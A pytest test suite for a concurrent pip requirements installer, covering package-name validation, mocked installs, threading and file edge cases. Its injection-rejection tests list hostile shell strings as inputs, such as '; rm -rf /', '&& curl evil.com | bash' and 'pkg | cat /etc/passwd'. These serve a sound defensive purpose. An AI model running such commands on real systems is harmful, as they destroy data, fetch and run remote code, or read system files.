"""
Comprehensive test suite for pip-turbo (install_requirements.py).

Covers:
  - Package name validation (security boundary)
  - Single-package install with subprocess mocking
  - Full concurrent orchestrator with file I/O
  - Edge cases: empty files, comments, whitespace, encodings
  - Concurrency correctness
"""

import os
import subprocess
import textwrap
import threading
from unittest import mock

import pytest

from install_requirements import (
    install_package,
    install_requirements,
    validate_package_name,
)


# ---------------------------------------------------------------------------
# validate_package_name
# ---------------------------------------------------------------------------

class TestValidatePackageName:
    """Security-critical: ensures only safe strings reach subprocess."""

    @pytest.mark.parametrize("name", [
        "requests",
        "Flask",
        "my-package",
        "my_package",
        "package123",
        "a",
    ])
    def test_simple_valid_names(self, name):
        assert validate_package_name(name) is True

    @pytest.mark.parametrize("name", [
        "requests==2.31.0",
        "Flask>=2.0",
        "numpy<2.0",
        "pandas!=1.5.0",
        "scipy~=1.11",
    ])
    def test_version_specifiers(self, name):
        assert validate_package_name(name) is True

    def test_comma_separated_constraints_not_supported(self):
        """Known limitation: the regex doesn't handle 'pkg>=1.0,<2.0'."""
        assert validate_package_name("torch>=1.0,<2.0") is False

    @pytest.mark.parametrize("name", [
        "package[extra]",
        "package[extra1,extra2]",
        "requests[security]>=2.0",
    ])
    def test_extras(self, name):
        assert validate_package_name(name) is True

    @pytest.mark.parametrize("name", [
        "  requests  ",
        " Flask ",
    ])
    def test_whitespace_is_stripped(self, name):
        assert validate_package_name(name) is True

    @pytest.mark.parametrize("name", [
        "; rm -rf /",
        "&& curl evil.com | bash",
        "$(whoami)",
        "`id`",
        "pkg; echo pwned",
        "pkg && malicious",
        "pkg | cat /etc/passwd",
        "",
        " ",
    ])
    def test_injection_attempts_rejected(self, name):
        assert validate_package_name(name) is False

    def test_name_must_start_with_alphanumeric(self):
        assert validate_package_name("-starts-with-dash") is False
        assert validate_package_name(".dotfirst") is False
        assert validate_package_name("_underfirst") is False


# ---------------------------------------------------------------------------
# install_package  (subprocess is mocked — no real pip calls)
# ---------------------------------------------------------------------------

class TestInstallPackage:

    @mock.patch("install_requirements.subprocess.check_call")
    def test_successful_install(self, mock_call):
        mock_call.return_value = 0
        pkg, success, err = install_package("requests")
        assert success is True
        assert err == ""
        mock_call.assert_called_once()
        args = mock_call.call_args[0][0]
        assert args[-2:] == ["install", "requests"]

    @mock.patch("install_requirements.subprocess.check_call",
                side_effect=subprocess.CalledProcessError(1, "pip"))
    def test_failed_install(self, mock_call):
        pkg, success, err = install_package("badpkg")
        assert success is False
        assert "non-zero exit status" in err.lower() or "exit status" in err.lower()

    @mock.patch("install_requirements.subprocess.check_call",
                side_effect=OSError("pip not found"))
    def test_unexpected_exception(self, mock_call):
        pkg, success, err = install_package("requests")
        assert success is False
        assert "pip not found" in err

    def test_invalid_name_short_circuits(self):
        pkg, success, err = install_package("; rm -rf /")
        assert success is False
        assert "Invalid package name" in err

    @mock.patch("install_requirements.subprocess.check_call")
    @mock.patch("install_requirements.os.name", "nt")
    def test_windows_pip_path(self, mock_call):
        mock_call.return_value = 0
        install_package("requests")
        pip_path = mock_call.call_args[0][0][0]
        assert "Scripts" in pip_path and pip_path.endswith("pip.exe")


# ---------------------------------------------------------------------------
# install_requirements  (full orchestrator)
# ---------------------------------------------------------------------------

class TestInstallRequirements:

    @pytest.fixture(autouse=True)
    def _tmpdir(self, tmp_path, monkeypatch):
        """Run each test inside an isolated temp directory."""
        monkeypatch.chdir(tmp_path)
        self.tmp = tmp_path

    def _write_req(self, content, name="requirements.txt"):
        p = self.tmp / name
        p.write_text(textwrap.dedent(content))
        return str(p)

    # -- missing file --

    def test_missing_file_prints_error(self, capsys):
        install_requirements("nonexistent.txt")
        assert "not found" in capsys.readouterr().out.lower()

    # -- empty / comments-only --

    def test_empty_file(self, capsys):
        path = self._write_req("")
        install_requirements(path)
        assert "no packages" in capsys.readouterr().out.lower()

    def test_comments_only(self, capsys):
        path = self._write_req("# just a comment\n# another\n")
        install_requirements(path)
        assert "no packages" in capsys.readouterr().out.lower()

    # -- all succeed --

    @mock.patch("install_requirements.install_package")
    def test_all_succeed(self, mock_ip, capsys):
        mock_ip.side_effect = lambda p: (p, True, "")
        path = self._write_req("alpha\nbeta\ngamma\n")
        install_requirements(path)
        out = capsys.readouterr().out
        assert "Successfully installed: 3" in out
        assert "Failed to install: 0" in out
        assert "All packages installed successfully" in out
        failed_path = self.tmp / "requirements_failed.txt"
        assert not failed_path.exists()

    # -- partial failure --

    @mock.patch("install_requirements.install_package")
    def test_partial_failure_writes_failed_file(self, mock_ip, capsys):
        def side(p):
            return (p, p != "bad", "boom" if p == "bad" else "")
        mock_ip.side_effect = side
        path = self._write_req("good\nbad\n")
        install_requirements(path)
        out = capsys.readouterr().out
        assert "Successfully installed: 1" in out
        assert "Failed to install: 1" in out
        failed = (self.tmp / "requirements_failed.txt").read_text()
        assert "bad" in failed
        assert "good" not in failed

    # -- custom failed_output path --

    @mock.patch("install_requirements.install_package",
                return_value=("x", False, "err"))
    def test_custom_failed_output(self, mock_ip):
        path = self._write_req("x\n")
        install_requirements(path, failed_output="my_failures.txt")
        assert (self.tmp / "my_failures.txt").exists()

    # -- blank lines & whitespace --

    @mock.patch("install_requirements.install_package")
    def test_blank_lines_ignored(self, mock_ip):
        mock_ip.side_effect = lambda p: (p, True, "")
        path = self._write_req("\n\nalpha\n\n\nbeta\n\n")
        install_requirements(path)
        assert mock_ip.call_count == 2

    # -- concurrency --

    @mock.patch("install_requirements.install_package")
    def test_concurrency_uses_multiple_threads(self, mock_ip):
        seen_threads = set()
        barrier = threading.Barrier(3, timeout=5)

        def slow_install(p):
            seen_threads.add(threading.current_thread().ident)
            barrier.wait()
            return (p, True, "")

        mock_ip.side_effect = slow_install
        path = self._write_req("a\nb\nc\n")
        install_requirements(path, max_workers=4)
        assert len(seen_threads) >= 2, "Expected concurrent execution across threads"

    # -- max_workers=1 serialises --

    @mock.patch("install_requirements.install_package")
    def test_single_worker(self, mock_ip):
        order = []

        def ordered(p):
            order.append(p)
            return (p, True, "")

        mock_ip.side_effect = ordered
        path = self._write_req("a\nb\nc\n")
        install_requirements(path, max_workers=1)
        assert len(order) == 3


# ---------------------------------------------------------------------------
# Integration-style: actually call install_package for a tiny safe package
# ---------------------------------------------------------------------------

class TestLiveSmoke:
    """Runs a real pip install — skip in CI with: pytest -m 'not live'"""

    @pytest.mark.live
    def test_install_real_tiny_package(self):
        pkg, success, err = install_package("six")
        assert success is True, f"Live install failed: {err}"
